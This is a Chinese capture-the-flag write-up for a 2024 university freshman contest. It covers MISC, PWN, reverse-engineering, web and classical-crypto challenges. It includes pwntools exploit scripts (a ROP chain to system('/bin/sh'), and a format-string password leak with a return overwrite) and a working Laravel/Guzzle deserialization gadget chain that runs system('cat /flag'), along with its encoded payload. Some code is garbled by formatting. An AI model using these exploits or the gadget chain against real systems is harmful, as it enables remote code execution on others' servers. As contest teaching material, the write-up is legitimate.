# UCTC CTF 2024高校新生网安赛 部分WriteUp

> 原文: https://www.ctfiot.com/218709.html
> ID: 218709

本文来自：天权信安网络安全生态圈  

作者：天权信安网络安全团队

MISC

神秘的文件

先打开附件，并不能直接打开 ，去010查看，发现关键压缩包特征字段，但是发现是反过来的，结合文件名“这是什么”，得知这是一个翻转过来的zip文件

def reverse(inp, out): with open(inp, 'rb') as f: data = f.read()
 r_data = data[::-1]
 with open(out, 'wb') as f: f.write(r_data)
inp = '么什是这.zip'out = 'output.zip'
reverse(inp, out)

发现文件头被改了，应该是50 4B 03 04，（后面那位是版本号位，并不太影响解压）

改完之后发现需要密码且不是伪加密（伪加密知识点请自行搜索），又在文件最后发现了这个

解压后是一张图片和flag.txt

图片里没东西，只是想让你们看看Buu娘有多可爱而已（bushi）然后看flag.txt

flag{m1sc_st39_I5_S0_inT3rEst1n9!}

PWN

EZ_Stack

Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)

from pwn import *def bug(): gdb.attach(p) pause()
def get_addr(): return u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))
def get_sb(): return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
sd = lambda data : p.send(data)sa = lambda text,data :p.sendafter(text, data)sl = lambda data :p.sendline(data)sla = lambda text,data :p.sendlineafter(text, data)rc = lambda num=4096 :p.recv(num)ru = lambda text :p.recvuntil(text)rl = lambda :p.recvline()pr = lambda num=4096 :
print(p.recv(num))ia = lambda :p.interactive()l32 = lambda :
u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))l64 = lambda :
u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))uu32 = lambda :
u32(p.recv(4).ljust(4,b'x00'))uu64 = lambda :
u64(p.recv(6).ljust(8,b'x00'))int16 = lambda data :
int(data,16)lg= lambda s, num :p.success('%s -> 0x%x' % (s, num))
context(arch = "amd64",os = "linux",log_level = "debug")context.terminal = ['gnome-terminal', '-x', 'sh', '-c']file = "./pwn"#libc = "./libc.so.6"libc = "/lib/x86_64-linux-gnu/libc.so.6"
p = process(file)elf = ELF(file)libc = ELF(libc)
system = p64(0x40079D) pop_rdi_ret = p64(0x4007a2) bin_sh = p64(0x602048) ret = p64(0x40053e) gift = p64(0x400781)
ru("!!!!n")payload = b'a'*0x4cpayload += p32(0x54)payload += pop_rdi_ret+bin_sh+system #ret + gift for i in payload: sd(bytearray([i])) # 单字节发送#sd(payload) 也可以直接发送payloadp.interactive()

userlogin

from pwn import *import sys
context.binary = bin = ELF("./pwn")context.arch = 'amd64'context.os = 'linux'context.log_level = 'debug'
n = len(sys.argv)if(n>1): arg = sys.argv[1].split(":") ip = arg[0] port = int(arg[1]) io = remote(ip,port)else: io = process(bin.path)
pause()
def login(password): io.sendlineafter(b'Password: ', password)
login(b'supersecureuser')io.recvline()io.sendline(b'%13$s')rootPassword = io.recvline()login(rootPassword)
payload = b'A'*0x28 + p64(0x401262)io.recvline()io.sendline(payload)
io.interactive()io.close()

REVERSE

hash&py

这是py??

Flag：flag{h@shiSe@sy}

软件格式64peexe

运行平台window

需要软件hex,pyinstxtractor

由图标发现是py软件

利用工具pyinstxtractor来解包，发现是3.8

找到hash文件改名为hash.pyc,查找py3.8的magicnumer

MAGIC_3_8 = 0x0A0D0D55,

修改二进制文件hash.pyc,插入文件16个，这个首部文件要填充这么多然后修改对应的二进制头部magicnumber，注意由于大小端需要倒过来

Struct是原本的文件格式

发现是md5，解密后发现四段flag为

flag{h@shiSe@sy}

测试

just_re_java

定位到这个类

boolean isCorrect = Enc.ah(userInput);if (isCorrect) {MainActivity.access$100(this.this$0, $(0, 2, -17515));} else {MainActivity.access$100(this.this$0, $(2, 4, -31808));}

在 Enc.ah 函数中对我们的 input 进行判断,返回一个 bool 值,最后用一个 if 判断来进行不同的

操作,我们先进 Enc.ah 函数看看

获取 flag 和我们的输入加密后进行对比并返回,函数名没有混淆,可以看见 base64 相关

是本地的一个函数,我们看看整个类的流程

估计是一个变了码表的 base64,我们把整个类复制到 java 在线运行里面调试,他也使用了 flag

类里面的函数,我们再看看 flag 类

$函数和 Enc 类中的一样,都使用了同一种字符串加密,最终返回的 flag 也只是使用了$(0, 32,

-11843);直接 copy 过去调试看看

Base 格式,那么密文我们就拿到了,在 Enc 里面把密文用他的码表解密就行了

把代码复制执行后发现存在报错

静态代码块内使用了 return(jadx 的反编译还是不太行(x))

改一改,改成 for 循环

解出 flag

代码如下:

import java.util.Arrays;public class Main {private static short[] $ = {3257, 3256, 3263, 3262, 3261, 3260, 3251, 3250, 3249, 3248, 3255, 3254, 3253, 3252, 3243, 3242, 3241, 3240, 3247, 3246, 3245, 3244, 3235, 3234, 3233, 3226, 3225, 3224, 3231, 3230, 3229, 3228, 3219, 3218, 3217, 3216, 3223, 3222, 3221, 3220, 3211, 3210, 3209, 3208, 3215, 3214, 3213, 3212, 3203, 3202, 3201, 3275, 3274, 3273, 3272, 3279, 3278, 3277, 3276, 3267, 3266, 3259, 3288};private static final char[] CUSTOM_BASE64_CHARS = $(0, 63, 3323).toCharArray();private static final byte[] CUSTOM_BASE64_INDEX;private static String $(int i, int i2, int i3) {char[] cArr = new char[i2 - i];for (int i4 = 0; i4 < i2 - i; i4++) {cArr[i4] = (char) ($[i + i4] ^ i3);}return new String(cArr);}static {byte[] bArr = new byte[256];CUSTOM_BASE64_INDEX = bArr;Arrays.fill(bArr, (byte) -1);for (int i = 0; i < CUSTOM_BASE64_CHARS.length; i++) {CUSTOM_BASE64_INDEX[CUSTOM_BASE64_CHARS[i]] = (byte) i;}}public static String encodeToCustomBase64(String input) {int i;
int i2;byte[] bytes = input.getBytes();StringBuilder sb = new StringBuilder();for (int b1 = 0; b1 < bytes.length; b1 = i) {int i3 = b1 + 1;
int b12 = bytes[b1] & 255;
int i4 = 0;if (i3 < bytes.length) {i = i3 + 1;i2 = bytes[i3] & 255;} else {i = i3;i2 = 0;}
if (i < bytes.length) {i4 = bytes[i] & 255;i++;}int c1 = b12 >> 2;
int c2 = ((b12 & 3) << 4) | (i2 >> 4);
int c3 = ((i2 & 15) << 2) | (i4 >> 6);
int c4 = i4 & 63;char[] cArr = CUSTOM_BASE64_CHARS;sb.append(cArr[c1]);sb.append(cArr[c2]);
char c = '=';sb.append(i <= bytes.length ? cArr[c3] : '=');if (i < bytes.length) {c = cArr[c4];}sb.append(c);}return sb.toString();}public static String decodeFromCustomBase64(String input) {int i;
int i2;byte[] bytes = input.getBytes();StringBuilder sb = new StringBuilder();for (int c1 = 0; c1 < bytes.length; c1 = i) {byte[] bArr = CUSTOM_BASE64_INDEX;
int i3 = c1 + 1;
int c12 = bArr[bytes[c1]];
int i4 = i3 + 1;
int c2 = bArr[bytes[i3]];
int i5 = 0;if (i4 < bytes.length) {i = i4 + 1;i2 = bArr[bytes[i4]];} else {i = i4;i2 = 0;}
if (i < bytes.length) {int i6 = bArr[bytes[i]];i++;i5 = i6;}int c4 = i5;
int b1 = (c12 << 2) | (c2 >> 4);
int b2 = ((c2 & 15) << 4) | (i2 >> 2);
int b3 = ((i2 & 3) << 6) | c4;sb.append((char) b1);if (i2 != 0) {sb.append((char) b2);}
if (c4 != 0) {sb.append((char) b3);}}return sb.toString();}public static void main(String[] args) {String flag = "W3WtZ3@uaW@Vc2@EWFZiUnW4V4SidhB=";String decode = decodeFromCustomBase64(flag);System.out.println(decode);}}

本题是一个 base64 可变码表的题目,但是我把码表修改少了一位,所以你们使用

cyberchef时可能会出错,防止偷鸡,当然,你们爆破也可以,但是单纯的base64太过简单,所以我

进行了字符串加密,在找不到字符串时又应该怎么做呢,我想,这是师傅希望大罗去自己解决.

just_re_so

Just_re_so

固定查壳和格式

除了 std 以外,流程还是很清晰的

Allocator,没什么好注意的

常量名也没有加密,将 16 进制的 key 每 8 位分成了 4 组进行 hex 转 uint32 再转 string

简单来说就是将 key 分成了 4 份

循环里面判断我们的输入长度是否是 32 位,是则退出,所以我们可以确定我们的输入应该是

32 位

不能说好不相似,只能说一模一样,同时题目描述也告诉过我们,这是一个标准的tea加密,那么

我们直接找到密文和key解密就行,但是要注意,他把key分成了四组进行加密,那么我们解密

的时候也需要同样的操作,那么我们现在开始找key和密文

那么可以确定,key就是Welcome_To_CTF,Newbie!Have_fun!!

好了,我们再找找密文

密文也找到了

ee85fa4bc4e5d52fd4fa925596be15ec539f7247ad6632d8bff87de577fed8cc

现在照着网上的tea解密算法copy还原算法就好了

#include #include <sstream>#include <cstdint>#include <array>#include <vector>#include #include <cstring>// 定义 TEA 轮数，标准建议至少 32 轮const int NUM_ROUNDS = 32;
const std::
string flag ="ee85fa4bc4e5d52fd4fa925596be15ec539f7247ad6632d8bff87de577fed8cc";//TEA 解密函数void tea_decrypt(uint32_t v[2], const uint32_t key[4]) {uint32_t v0 = v[0], v1 = v[1];
uint32_t delta = 0x9E3779B9;//uint32_t sum = delta * NUM_ROUNDS & 0xFFFFFFFF;
uint32_t sum = 0xC6EF3720;for (uint32_t i = 0; i < NUM_ROUNDS; ++i) {v1 -= ((v0 << 4) + key[2]) ^ (v0 + sum) ^ ((v0 >> 5) + key[3]);sum -= delta;v0 -= ((v1 << 4) + key[0]) ^ (v1 + sum) ^ ((v1 >> 5) + key[1]);}v[0] = v0;v[1] = v1;}// 将 16 进制字符串转换为 32 位整数uint32_t hex_to_uint32(const std::
string& hex) {std::
stringstream ss;ss << std::
hex << hex;
uint32_t result;ss >> result;
return result;}// 将 32 位整数块转换为字符串std::
string blocks_to_string(const std::
vector& blocks) {std::
string str;str.reserve(blocks.size() * 4);for (uint32_t block : blocks) {for (int i = 0; i < 4; ++i) {str.push_back(static_cast<char>((block >> (24 - i * 8)) & 0xFF));}}return str;}std::
vector hex_to_blocks(const std::
string& hex_str) {std::
vector blocks;for (size_t i = 0; i < hex_str.length(); i += 8) {std::
string block_str = hex_str.substr(i, 8);
uint32_t block = hex_to_uint32(block_str);blocks.push_back(block);}return blocks;}int main() {// 测试数据std::
string enflag = flag;std::
string key_hex = "Welcome_To_CTF,Newbie!Have_fun!!";std::
array key = {hex_to_uint32(key_hex.substr(0, 8)), hex_to_uint32(key_hex.substr(8, 8)), hex_to_uint32(key_hex.substr(16, 8)), hex_to_uint32(key_hex.substr(24, 8))};// 将加密后的 16 进制字符串转换为 32 位整数块std::
vector encrypted_blocks = hex_to_blocks(enflag);// 解密for (size_t i = 0; i < encrypted_blocks.size(); i += 2) {tea_decrypt(&encrypted_blocks[i], key.data());}// 解密后的数据std::
string decrypted = blocks_to_string(encrypted_blocks);std::
cout << "Decrypted: " << decrypted << std::
endl;
return 0;}

总结:

一个很普通的 ctf 加密,但是如果是第一次尝试可能会找不到 key 和密文,但是

shift+f12 或许也能有一线生机,虽然是标准 tea 加密,但 key 还是要做变动,照着 ida 反汇编的

copy 再改改就好了,对于初出茅庐的大罗可能会有点困难,或许,这是师傅对他吃饱了撑的的

一剂健胃消食片吧.

WEB

ezLaravel

访问www.zip下载源码，代码审计：

我已经将之前的历史反序列化漏洞都修补好了。需要重新挖掘新的反序列化链。不过可以参考我发的一篇文章https://www.freebuf.com/vuls/357594.html。文章中的反序列化链是文件包含的。解这个题的链子需要rce，所以需要更改反序列化链的后半部分。

反序列化入口，

GuzzleHttpCookieFileCookieJar#__destruct()方法，调用__toString()：

调用任意类get()方法，

IlluminateFilesystemFilesystemAdapter#get()：

任意类read()方法调用，

IlluminateSessionCookieSessionHandler#read()：

任意类__get()方法调用，

IlluminateSupportHigherOrderCollectionProxy类:

任意类任意(无参)方法调用，

PHPUnitFrameworkMockObjectMockClass：

<?phpnamespace GuzzleHttpCookie{

 use IlluminateFilesystemFilesystemAdapter; use IlluminateViewFileViewFinder; use IlluminateViewView; use IlluminateViewFactory; use IlluminateViewEnginesEngineResolver; use IlluminateFilesystemFilesystem;
 class CookieJar{ //调用__toString private $cookies = []; function __construct() { $this->cookies[] = []; } } class FileCookieJar extends CookieJar { private $filename; function __construct() { parent::
__construct(); $this->filename = new View(new Factory(new EngineResolver(),new FileViewFinder(new Filesystem(),["./"])),new FilesystemAdapter(),200,"./info.php",["index"]); } }}namespace IlluminateView{ //调用任意类get方法

 use IlluminateEventsDispatcher; use IlluminateFilesystemFilesystem; use IlluminateFilesystemFilesystemAdapter; use IlluminateViewEnginesEngineResolver;

 class FileViewFinder implements ViewFinderInterface{ public function __construct(Filesystem $files, array $paths, array $extensions = null){} } interface ViewFinderInterface{} class Factory{ protected $shared = []; public function __construct(EngineResolver $engines, ViewFinderInterface $finder){ $this->shared = []; $this->finder = $finder; $this->events = new Dispatcher(); $this->engines = $engines; } } class View{ protected $data; public function __construct(Factory $factory, FilesystemAdapter $engine, $view, $path){ $this->view = $view; $this->path = $path; $this->engine = $engine; $this->factory = $factory; $this->data = []; } }}
namespace IlluminateFilesystem{ //调用read方法
 use IlluminateSessionCookieSessionHandler;
 class Filesystem{} class FilesystemAdapter{ protected $driver; public function __construct(){ $this->driver = new CookieSessionHandler(); } }}namespace IlluminateViewEngines{ class EngineResolver{}}namespace IlluminateEvents{ use IlluminateContractsEventsDispatcher as DispatcherContract; class Dispatcher implements DispatcherContract{}
}namespace IlluminateContractsEvents{ interface Dispatcher{};}
namespace IlluminateSession{ use IlluminateSupportHigherOrderCollectionProxy; class CookieSessionHandler{ public function __construct(){ $this->request = new HigherOrderCollectionProxy(); } }}namespace IlluminateSupport{
 use PHPUnitFrameworkMockObjectMockClass;
 class HigherOrderCollectionProxy{ public function __construct(){ $this->collection = new MockClass(); $this->method = "generate"; } }}namespace PHPUnitFrameworkMockObject{ final class MockClass{ public function __construct(){ $this->classCode = "system('cat /flag');"; $this->mockName = '123'; } }}

namespace{
 use GuzzleHttpCookieFileCookieJar;
 $pop = new FileCookieJar(); echo urlencode(base64_encode(serialize($pop)));}
//TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6Mjp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO086MjA6IklsbHVtaW5hdGVcVmlld1xWaWV3Ijo1OntzOjc6IgAqAGRhdGEiO2E6MDp7fXM6NDoidmlldyI7aToyMDA7czo0OiJwYXRoIjtzOjEwOiIuL2luZm8ucGhwIjtzOjY6ImVuZ2luZSI7TzozOToiSWxsdW1pbmF0ZVxGaWxlc3lzdGVtXEZpbGVzeXN0ZW1BZGFwdGVyIjoxOntzOjk6IgAqAGRyaXZlciI7TzozOToiSWxsdW1pbmF0ZVxTZXNzaW9uXENvb2tpZVNlc3Npb25IYW5kbGVyIjoxOntzOjc6InJlcXVlc3QiO086NDU6IklsbHVtaW5hdGVcU3VwcG9ydFxIaWdoZXJPcmRlckNvbGxlY3Rpb25Qcm94eSI6Mjp7czoxMDoiY29sbGVjdGlvbiI7TzozODoiUEhQVW5pdFxGcmFtZXdvcmtcTW9ja09iamVjdFxNb2NrQ2xhc3MiOjI6e3M6OToiY2xhc3NDb2RlIjtzOjIwOiJzeXN0ZW0oJ2NhdCAvZmxhZycpOyI7czo4OiJtb2NrTmFtZSI7czozOiIxMjMiO31zOjY6Im1ldGhvZCI7czo4OiJnZW5lcmF0ZSI7fX19czo3OiJmYWN0b3J5IjtPOjIzOiJJbGx1bWluYXRlXFZpZXdcRmFjdG9yeSI6NDp7czo5OiIAKgBzaGFyZWQiO2E6MDp7fXM6NjoiZmluZGVyIjtPOjMwOiJJbGx1bWluYXRlXFZpZXdcRmlsZVZpZXdGaW5kZXIiOjA6e31zOjY6ImV2ZW50cyI7TzoyODoiSWxsdW1pbmF0ZVxFdmVudHNcRGlzcGF0Y2hlciI6MDp7fXM6NzoiZW5naW5lcyI7TzozODoiSWxsdW1pbmF0ZVxWaWV3XEVuZ2luZXNcRW5naW5lUmVzb2x2ZXIiOjA6e319fXM6MzY6IgBHdXp6bGVIdHRwXENvb2tpZVxDb29raWVKYXIAY29va2llcyI7YToxOntpOjA7YTowOnt9fX0%3D

密码学

重生之我是福尔摩斯

重生之我是福尔莫斯

考点：古典密码

1. 跳舞的小人

2. 维吉尼亚密码

3. 仿射密码

第二张照片为真，所以这里只对第二张照片进行讲解

根据照片显示得知是跳舞的小人密码，解密

得到密文

然后根据提示affine 在凌晨 3 点 5 分时被杀害

得知是affine密码 然后参数a和b为3，5

然后进行解密得到flag

○

以上为本次比赛WP如有问题请私信或联系群内管理员相关人员反馈

注：

由于文章处理问题，有些代码可能存在前进格格式问题，可自行处理也可询问后台或群内管理员给予源码

— 结束 —

赛事举办联系方式

联系人：张先生

VX：Evan-xuanjing

邮箱：game@megrezsec.cn/赛事QQ群：895959607

    往期回顾   

UCTC CTF 2024高校新生网安赛

第十七届全国大学生信息安全竞赛——创新实践能力赛初赛-WriteUp

第二届数据安全大赛暨首届“数信杯”北部赛区writeup

–天权信安网络安全团队–

网络无边 安全有界

2022，感恩有您

2023，携手同行

用技术撬动未来，用奋斗描绘成功！


```
def reverse(inp, out): with open(inp, 'rb') as f: data = f.read()
 r_data = data[::-1]
 with open(out, 'wb') as f: f.write(r_data)
inp = '么什是这.zip'out = 'output.zip'
reverse(inp, out)
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)
from pwn import *def bug(): gdb.attach(p) pause()
def get_addr(): return u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))
def get_sb(): return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
sd = lambda data : p.send(data)sa = lambda text,data :p.sendafter(text, data)sl = lambda data :p.sendline(data)sla = lambda text,data :p.sendlineafter(text, data)rc = lambda num=4096 :p.recv(num)ru = lambda text :p.recvuntil(text)rl = lambda :p.recvline()pr = lambda num=4096 :
print(p.recv(num))ia = lambda :p.interactive()l32 = lambda :
u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))l64 = lambda :
u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))uu32 = lambda :
u32(p.recv(4).ljust(4,b'x00'))uu64 = lambda :
u64(p.recv(6).ljust(8,b'x00'))int16 = lambda data :
int(data,16)lg= lambda s, num :p.success('%s -> 0x%x' % (s, num))
context(arch = "amd64",os = "linux",log_level = "debug")context.terminal = ['gnome-terminal', '-x', 'sh', '-c']file = "./pwn"#libc = "./libc.so.6"libc = "/lib/x86_64-linux-gnu/libc.so.6"
p = process(file)elf = ELF(file)libc = ELF(libc)
system = p64(0x40079D) pop_rdi_ret = p64(0x4007a2) bin_sh = p64(0x602048) ret = p64(0x40053e) gift = p64(0x400781)
ru("!!!!n")payload = b'a'*0x4cpayload += p32(0x54)payload += pop_rdi_ret+bin_sh+system #ret + gift for i in payload: sd(bytearray([i])) # 单字节发送#sd(payload) 也可以直接发送payloadp.interactive()
from pwn import *import sys
context.binary = bin = ELF("./pwn")context.arch = 'amd64'context.os = 'linux'context.log_level = 'debug'
n = len(sys.argv)if(n>1): arg = sys.argv[1].split(":") ip = arg[0] port = int(arg[1]) io = remote(ip,port)else: io = process(bin.path)
pause()
def login(password): io.sendlineafter(b'Password: ', password)
login(b'supersecureuser')io.recvline()io.sendline(b'%13$s')rootPassword = io.recvline()login(rootPassword)
payload = b'A'*0x28 + p64(0x401262)io.recvline()io.sendline(payload)
io.interactive()io.close()
boolean isCorrect = Enc.ah(userInput);if (isCorrect) {MainActivity.access$100(this.this$0, $(0, 2, -17515));} else {MainActivity.access$100(this.this$0, $(2, 4, -31808));}
import java.util.Arrays;public class Main {private static short[] $ = {3257, 3256, 3263, 3262, 3261, 3260, 3251, 3250, 3249, 3248, 3255, 3254, 3253, 3252, 3243, 3242, 3241, 3240, 3247, 3246, 3245, 3244, 3235, 3234, 3233, 3226, 3225, 3224, 3231, 3230, 3229, 3228, 3219, 3218, 3217, 3216, 3223, 3222, 3221, 3220, 3211, 3210, 3209, 3208, 3215, 3214, 3213, 3212, 3203, 3202, 3201, 3275, 3274, 3273, 3272, 3279, 3278, 3277, 3276, 3267, 3266, 3259, 3288};private static final char[] CUSTOM_BASE64_CHARS = $(0, 63, 3323).toCharArray();private static final byte[] CUSTOM_BASE64_INDEX;private static String $(int i, int i2, int i3) {char[] cArr = new char[i2 - i];for (int i4 = 0; i4 < i2 - i; i4++) {cArr[i4] = (char) ($[i + i4] ^ i3);}return new String(cArr);}static {byte[] bArr = new byte[256];CUSTOM_BASE64_INDEX = bArr;Arrays.fill(bArr, (byte) -1);for (int i = 0; i < CUSTOM_BASE64_CHARS.length; i++) {CUSTOM_BASE64_INDEX[CUSTOM_BASE64_CHARS[i]] = (byte) i;}}public static String encodeToCustomBase64(String input) {int i;
int i2;byte[] bytes = input.getBytes();StringBuilder sb = new StringBuilder();for (int b1 = 0; b1 < bytes.length; b1 = i) {int i3 = b1 + 1;
int b12 = bytes[b1] & 255;
int i4 = 0;if (i3 < bytes.length) {i = i3 + 1;i2 = bytes[i3] & 255;} else {i = i3;i2 = 0;}
if (i < bytes.length) {i4 = bytes[i] & 255;i++;}int c1 = b12 >> 2;
int c2 = ((b12 & 3) << 4) | (i2 >> 4);
int c3 = ((i2 & 15) << 2) | (i4 >> 6);
int c4 = i4 & 63;char[] cArr = CUSTOM_BASE64_CHARS;sb.append(cArr[c1]);sb.append(cArr[c2]);
char c = '=';sb.append(i <= bytes.length ? cArr[c3] : '=');if (i < bytes.length) {c = cArr[c4];}sb.append(c);}return sb.toString();}public static String decodeFromCustomBase64(String input) {int i;
int i2;byte[] bytes = input.getBytes();StringBuilder sb = new StringBuilder();for (int c1 = 0; c1 < bytes.length; c1 = i) {byte[] bArr = CUSTOM_BASE64_INDEX;
int i3 = c1 + 1;
int c12 = bArr[bytes[c1]];
int i4 = i3 + 1;
int c2 = bArr[bytes[i3]];
int i5 = 0;if (i4 < bytes.length) {i = i4 + 1;i2 = bArr[bytes[i4]];} else {i = i4;i2 = 0;}
if (i < bytes.length) {int i6 = bArr[bytes[i]];i++;i5 = i6;}int c4 = i5;
int b1 = (c12 << 2) | (c2 >> 4);
int b2 = ((c2 & 15) << 4) | (i2 >> 2);
int b3 = ((i2 & 3) << 6) | c4;sb.append((char) b1);if (i2 != 0) {sb.append((char) b2);}
if (c4 != 0) {sb.append((char) b3);}}return sb.toString();}public static void main(String[] args) {String flag = "W3WtZ3@uaW@Vc2@EWFZiUnW4V4SidhB=";String decode = decodeFromCustomBase64(flag);System.out.println(decode);}}
    #include #include <sstream>#include <cstdint>#include <array>#include <vector>#include #include <cstring>// 定义 TEA 轮数，标准建议至少 32 轮const int NUM_ROUNDS = 32;
const std::
string flag ="ee85fa4bc4e5d52fd4fa925596be15ec539f7247ad6632d8bff87de577fed8cc";//TEA 解密函数void tea_decrypt(uint32_t v[2], const uint32_t key[4]) {uint32_t v0 = v[0], v1 = v[1];
uint32_t delta = 0x9E3779B9;//uint32_t sum = delta * NUM_ROUNDS & 0xFFFFFFFF;
uint32_t sum = 0xC6EF3720;for (uint32_t i = 0; i < NUM_ROUNDS; ++i) {v1 -= ((v0 << 4) + key[2]) ^ (v0 + sum) ^ ((v0 >> 5) + key[3]);sum -= delta;v0 -= ((v1 << 4) + key[0]) ^ (v1 + sum) ^ ((v1 >> 5) + key[1]);}v[0] = v0;v[1] = v1;}// 将 16 进制字符串转换为 32 位整数uint32_t hex_to_uint32(const std::
string& hex) {std::
stringstream ss;ss << std::
hex << hex;
uint32_t result;ss >> result;
return result;}// 将 32 位整数块转换为字符串std::
string blocks_to_string(const std::
vector& blocks) {std::
string str;str.reserve(blocks.size() * 4);for (uint32_t block : blocks) {for (int i = 0; i < 4; ++i) {str.push_back(static_cast<char>((block >> (24 - i * 8)) & 0xFF));}}return str;}std::
vector hex_to_blocks(const std::
string& hex_str) {std::
vector blocks;for (size_t i = 0; i < hex_str.length(); i += 8) {std::
string block_str = hex_str.substr(i, 8);
uint32_t block = hex_to_uint32(block_str);blocks.push_back(block);}return blocks;}int main() {// 测试数据std::
string enflag = flag;std::
string key_hex = "Welcome_To_CTF,Newbie!Have_fun!!";std::
array key = {hex_to_uint32(key_hex.substr(0, 8)), hex_to_uint32(key_hex.substr(8, 8)), hex_to_uint32(key_hex.substr(16, 8)), hex_to_uint32(key_hex.substr(24, 8))};// 将加密后的 16 进制字符串转换为 32 位整数块std::
vector encrypted_blocks = hex_to_blocks(enflag);// 解密for (size_t i = 0; i < encrypted_blocks.size(); i += 2) {tea_decrypt(&encrypted_blocks[i], key.data());}// 解密后的数据std::
string decrypted = blocks_to_string(encrypted_blocks);std::
cout << "Decrypted: " << decrypted << std::
endl;
return 0;}
<?phpnamespace GuzzleHttpCookie{

 use IlluminateFilesystemFilesystemAdapter; use IlluminateViewFileViewFinder; use IlluminateViewView; use IlluminateViewFactory; use IlluminateViewEnginesEngineResolver; use IlluminateFilesystemFilesystem;
 class CookieJar{ //调用__toString private $cookies = []; function __construct() { $this->cookies[] = []; } } class FileCookieJar extends CookieJar { private $filename; function __construct() { parent::
__construct(); $this->filename = new View(new Factory(new EngineResolver(),new FileViewFinder(new Filesystem(),["./"])),new FilesystemAdapter(),200,"./info.php",["index"]); } }}namespace IlluminateView{ //调用任意类get方法

 use IlluminateEventsDispatcher; use IlluminateFilesystemFilesystem; use IlluminateFilesystemFilesystemAdapter; use IlluminateViewEnginesEngineResolver;

 class FileViewFinder implements ViewFinderInterface{ public function __construct(Filesystem $files, array $paths, array $extensions = null){} } interface ViewFinderInterface{} class Factory{ protected $shared = []; public function __construct(EngineResolver $engines, ViewFinderInterface $finder){ $this->shared = []; $this->finder = $finder; $this->events = new Dispatcher(); $this->engines = $engines; } } class View{ protected $data; public function __construct(Factory $factory, FilesystemAdapter $engine, $view, $path){ $this->view = $view; $this->path = $path; $this->engine = $engine; $this->factory = $factory; $this->data = []; } }}
namespace IlluminateFilesystem{ //调用read方法
 use IlluminateSessionCookieSessionHandler;
 class Filesystem{} class FilesystemAdapter{ protected $driver; public function __construct(){ $this->driver = new CookieSessionHandler(); } }}namespace IlluminateViewEngines{ class EngineResolver{}}namespace IlluminateEvents{ use IlluminateContractsEventsDispatcher as DispatcherContract; class Dispatcher implements DispatcherContract{}
}namespace IlluminateContractsEvents{ interface Dispatcher{};}
namespace IlluminateSession{ use IlluminateSupportHigherOrderCollectionProxy; class CookieSessionHandler{ public function __construct(){ $this->request = new HigherOrderCollectionProxy(); } }}namespace IlluminateSupport{
 use PHPUnitFrameworkMockObjectMockClass;
 class HigherOrderCollectionProxy{ public function __construct(){ $this->collection = new MockClass(); $this->method = "generate"; } }}namespace PHPUnitFrameworkMockObject{ final class MockClass{ public function __construct(){ $this->classCode = "system('cat /flag');"; $this->mockName = '123'; } }}

namespace{
 use GuzzleHttpCookieFileCookieJar;
 $pop = new FileCookieJar(); echo urlencode(base64_encode(serialize($pop)));}
//TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6Mjp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO086MjA6IklsbHVtaW5hdGVcVmlld1xWaWV3Ijo1OntzOjc6IgAqAGRhdGEiO2E6MDp7fXM6NDoidmlldyI7aToyMDA7czo0OiJwYXRoIjtzOjEwOiIuL2luZm8ucGhwIjtzOjY6ImVuZ2luZSI7TzozOToiSWxsdW1pbmF0ZVxGaWxlc3lzdGVtXEZpbGVzeXN0ZW1BZGFwdGVyIjoxOntzOjk6IgAqAGRyaXZlciI7TzozOToiSWxsdW1pbmF0ZVxTZXNzaW9uXENvb2tpZVNlc3Npb25IYW5kbGVyIjoxOntzOjc6InJlcXVlc3QiO086NDU6IklsbHVtaW5hdGVcU3VwcG9ydFxIaWdoZXJPcmRlckNvbGxlY3Rpb25Qcm94eSI6Mjp7czoxMDoiY29sbGVjdGlvbiI7TzozODoiUEhQVW5pdFxGcmFtZXdvcmtcTW9ja09iamVjdFxNb2NrQ2xhc3MiOjI6e3M6OToiY2xhc3NDb2RlIjtzOjIwOiJzeXN0ZW0oJ2NhdCAvZmxhZycpOyI7czo4OiJtb2NrTmFtZSI7czozOiIxMjMiO31zOjY6Im1ldGhvZCI7czo4OiJnZW5lcmF0ZSI7fX19czo3OiJmYWN0b3J5IjtPOjIzOiJJbGx1bWluYXRlXFZpZXdcRmFjdG9yeSI6NDp7czo5OiIAKgBzaGFyZWQiO2E6MDp7fXM6NjoiZmluZGVyIjtPOjMwOiJJbGx1bWluYXRlXFZpZXdcRmlsZVZpZXdGaW5kZXIiOjA6e31zOjY6ImV2ZW50cyI7TzoyODoiSWxsdW1pbmF0ZVxFdmVudHNcRGlzcGF0Y2hlciI6MDp7fXM6NzoiZW5naW5lcyI7TzozODoiSWxsdW1pbmF0ZVxWaWV3XEVuZ2luZXNcRW5naW5lUmVzb2x2ZXIiOjA6e319fXM6MzY6IgBHdXp6bGVIdHRwXENvb2tpZVxDb29raWVKYXIAY29va2llcyI7YToxOntpOjA7YTowOnt9fX0%3D
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/10-1733460420.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/2-1733460421.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/8-1733460422.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/6-1733460423.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/6-1733460423.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/7-1733460424.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/12/2-1733460425.png)
